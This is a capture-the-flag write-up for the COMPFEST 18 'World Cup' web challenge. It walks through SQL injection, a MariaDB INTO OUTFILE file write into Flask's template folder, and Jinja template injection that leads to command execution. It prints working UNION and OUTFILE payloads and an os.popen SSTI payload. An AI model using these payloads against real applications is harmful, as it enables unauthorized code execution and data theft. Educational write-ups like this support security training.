# World Cup — COMPFEST 18 Web

**Category:** Web
**Flag:** `COMPFEST18{Messi_Messi_Messi_Encara_Messi_WKNLUWa9gXvlwB7L}`

Flask ticket-office app. Full chain is SQL injection → arbitrary file write via `INTO OUTFILE` → SSTI on a template we control → RCE to read the flag.

## Recon

The app has a `/match?id=` endpoint that renders match details. First thing to try on any numeric ID param is a broken quote or a `union`:

```
/match?id=1%20union
```

Got a 500 with a MariaDB error, and the page conveniently dumps a "Lookup trace" showing the raw query:

```sql
SELECT m.id, m.round, DATE_FORMAT(m.match_time, '%d %b %Y, %H:%i') AS match_time,
       m.status, h.name AS home_team, h.country_code AS home_code,
       a.name AS away_team, a.country_code AS away_code,
       s.name AS stadium, s.city, s.country, s.capacity
FROM matches m
JOIN teams h ON h.id = m.home_team_id
JOIN teams a ON a.id = m.away_team_id
JOIN stadiums s ON s.id = m.stadium_id
WHERE m.id = <input>
```

So `id` goes straight into the WHERE clause, unsanitized, and the app leaks the query on error. That's basically a free schema map before you even start.

`id=1 and 1=2` → "No fixture found" (valid boolean-based behavior).
`order by 12-- -` works, `order by 13-- -` breaks → **12 columns**.

## Confirming UNION output

```sql
0 union all select 1,2,3,4,5,6,7,8,9,10,11,12-- -
```

Mapped which columns actually render on the page: col 2 = round/eyebrow, col 3 = time/meta, col 5 = home team, col 7 = away team, col 9/10/11 = stadium/city/country, col 12 = capacity. Enough to exfiltrate arbitrary strings through columns 5 and 7:

```sql
0 union all select
999,'G1',
concat('HOME:',database()),
0,
concat('TEAMA:',user()),
0,
concat('TEAMB:',version()),
0,'STAD','CITY','CTRY','777'-- -
```

`database()` → `worldcup`, `user()` → `ctfuser@localhost`.

## The interesting bit: secure_file_priv

Checked `@@secure_file_priv` the same way — and it wasn't empty or `NULL` (which would mean no file ops allowed), it was set to:

```
/app/templates/
```

That's the actual key to the box. MariaDB will let `LOAD_FILE` / `INTO OUTFILE` touch only that directory — and that directory happens to be Flask's Jinja template folder. If you can write a file there, and something in the app renders a template from that folder using user-influenced input (or even a fixed filename), you get SSTI for free.

Dumped the rest of the schema for the sake of it (`orders`, `tickets`, `payments`, `users`, `audit_logs`, etc.) but the payoff was in `audit_logs`:

```json
{"name":"final week release","template":"/app/templates/live_promo.html","route":"/promo/final-week","status":"missing"}
{"match":"Final","status":"limited_release"}
```

Confirmed by hitting the route directly:

```
GET /promo/final-week
```

→ 500, `TemplateNotFound: live_promo.html`. So the route is real, it's just waiting for a template file that doesn't exist yet.

## Write the template via INTO OUTFILE

Since `secure_file_priv` points at the templates folder, and the missing file's path is known, the plan is:

1. Write `live_promo.html` into `/app/templates/` containing a Jinja SSTI payload.
2. Hit `/promo/final-week` so Flask renders it.

SSTI payload (classic Jinja sandbox escape via `cycler`, no `{% %}` needed):

```jinja2
{{ cycler.__init__.__globals__.os.popen("cat /flag 2>/dev/null || cat /flag.txt 2>/dev/null || cat /app/flag 2>/dev/null || cat /app/flag.txt 2>/dev/null").read() }}
```

(Earlier attempt used a `for f in ...; do [ -f "$f" ] && cat "$f"; done` shell loop — worked logically but kept tripping over quote escaping once it passed through Python → SQL hex-encoding → shell. Chained `cat X || cat Y` sidesteps the quoting mess entirely and is more reliable for one-shot payloads like this.)

Delivered as hex-encoded string through the UNION (avoids quote-escaping issues inside the SQL string literal itself):

```sql
0 union all select
0x7b7b206379636c65722e5f5f696e69745f5f2e5f5f676c6f62616c735f5f2e6f732e706f70656e28226361742...,
NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
into outfile '/app/templates/live_promo.html'-- -
```

Then:

```
GET /promo/final-week
```

renders the template — which means Jinja evaluates the `{{ }}` block, `cycler.__init__.__globals__.os.popen(...)` runs, and the flag comes back in the response body.

## Gotcha: OUTFILE can't overwrite

`SELECT ... INTO OUTFILE` refuses to touch a file that already exists — no truncate, no overwrite, just an error:

```
File '/app/templates/live_promo.html' already exists
```

This bit us hard. After a first payload had a broken shell quoting issue, the file was already sitting there with a syntax-error version of the template, and every retry on that instance just failed with the above error instead of updating the content. `/promo/final-week` on that instance returned `TemplateSyntaxError` no matter what we sent afterward.

There's no "delete via SQLi" path here (no LOAD_FILE-based unlink, no second injection point), so the only fix is a clean instance where `live_promo.html` has never been written — then run the exploit exactly once, correctly, on the first try.

## Automation

`solve.py` does the whole thing end to end against a given host:

1. Authenticates against the CTFd instance proxy (`__ctfd_auth`) using the CTFd session token — without this, requests just hit CTFd's "Access Token" landing page instead of the actual app.
2. Fires the SQLi/UNION payload to write `live_promo.html`.
3. Requests `/promo/final-week`.
4. Prints the response, which contains the flag.

```bash
python3 solve.py http://<host>:<port>
```

Ran it against a fresh instance and got the flag straight out of the response:

```
COMPFEST18{Messi_Messi_Messi_Encara_Messi_WKNLUWa9gXvlwB7L}
```
